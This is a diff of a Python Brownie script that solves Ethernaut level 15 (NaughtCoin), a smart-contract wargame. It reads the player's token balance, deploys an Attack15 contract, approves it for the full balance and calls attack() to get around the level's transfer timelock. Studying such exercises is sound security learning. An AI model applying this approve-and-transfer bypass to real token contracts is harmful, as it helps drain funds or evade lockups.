@@ -1,18 +1,24 @@
 from scripts.helpful_scripts import get_account
-from brownie import web3, interface, Attack15
+from brownie import web3, interface, Attack15, NaughtCoin
 
 
-ETHERNAUT_INSTANCE = "0x23c8BcEB66E6798E35FE89Dc7fa331ED731B9bFe"
-PLAYER = "0xF8f8269488f73fab3935555FCDdD6035699deE25"
-
-GAS_LIMIT = 6000000
-INITIAL_SUPPLY = "1 ether"
+ETHERNAUT_INSTANCE = "0x1a6B4e0C97C707b06506B953d1A4568EB3c28cFA"
+GAS_LIMIT = 600000
+# SUPPLY = 1000000000000000000000000
 
 
 def main():
 
     player = get_account()
 
-    attack = Attack15.deploy(ETHERNAUT_INSTANCE, {"from": player})
+    coin = NaughtCoin.at(ETHERNAUT_INSTANCE)
 
-    # attack.attack(ETHERNAUT_INSTANCE, PLAYER, INITIAL_SUPPLY, {"from": player})
+    balance = coin.balanceOf(player)
+    print(f"\nBalance of contract = {balance}\n")
+
+    attack = Attack15.deploy(ETHERNAUT_INSTANCE, {"from": player})
+    coin.approve(attack.address, balance, {"from": player})
+    attack.attack({"from": player})
+
+    balance = coin.balanceOf(player)
+    print(f"\nBalance of contract = {balance}\n")
